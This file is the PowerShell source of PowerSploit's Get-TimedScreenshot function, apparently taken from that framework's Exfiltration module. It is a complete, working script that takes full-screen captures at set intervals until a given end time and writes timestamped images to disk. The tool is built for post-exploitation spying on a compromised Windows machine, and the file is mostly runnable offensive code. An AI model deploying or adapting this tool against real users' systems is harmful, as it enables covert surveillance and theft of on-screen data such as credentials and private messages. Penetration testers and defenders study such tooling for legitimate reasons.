function Get-TimedScreenshot
{
<#
.SYNOPSIS

Takes screenshots at a regular interval and saves them to disk.

PowerSploit Function: Get-TimedScreenshot
Author: Chris Campbell (@obscuresec)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
    
.DESCRIPTION

A function that takes screenshots and saves them to a folder.

.PARAMETER Path

Specifies the folder path.
    
.PARAMETER Interval
    
Specifies the interval in seconds between taking screenshots.

.PARAMETER EndTime

Specifies when the script should stop running in the format HH-MM 

.EXAMPLE 

PS C:\> Get-TimedScreenshot -Path c:\temp\ -Interval 30 -EndTime 14:00 
 
.LINK

http://obscuresecurity.blogspot.com/2013/01/Get-TimedScreenshot.html
https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-TimedScreenshot.ps1
#>

    [CmdletBinding()] Param(
        [Parameter(Mandatory=$True)]             
        [ValidateScript({Test-Path -Path $_ })]
        [String] $Path, 

        [Parameter(Mandatory=$True)]             
        [Int32] $Interval,

        [Parameter(Mandatory=$True)]             
        [String] $EndTime    
    )

    #Define helper function that generates and saves screenshot
    Function Get-Screenshot {
       $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen
       $ScreenshotObject = New-Object Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height
       $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject)
       $DrawingGraphics.CopyFromScreen( $ScreenBounds.Location, [Drawing.Point]::Empty, $ScreenBounds.Size)
       $DrawingGraphics.Dispose()
       $ScreenshotObject.Save($FilePath)
       $ScreenshotObject.Dispose()
    }

    Try {
            
        #load required assembly
        Add-Type -Assembly System.Windows.Forms            

        Do {
            #get the current time and build the filename from it
            $Time = (Get-Date)
            
            [String] $FileName = "$($Time.Month)"
            $FileName += '-'
            $FileName += "$($Time.Day)" 
            $FileName += '-'
            $FileName += "$($Time.Year)"
            $FileName += '-'
            $FileName += "$($Time.Hour)"
            $FileName += '-'
            $FileName += "$($Time.Minute)"
            $FileName += '-'
            $FileName += "$($Time.Second)"
            $FileName += '.png'
            
            #use join-path to add path to filename
            [String] $FilePath = (Join-Path $Path $FileName)

            #run screenshot function
            Get-Screenshot
               
            Write-Verbose "Saved screenshot to $FilePath. Sleeping for $Interval seconds"

            Start-Sleep -Seconds $Interval
        }

        #note that this will run once regardless if the specified time as passed
        While ((Get-Date -Format HH:mm) -lt $EndTime)
    }

    Catch {Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage}
}
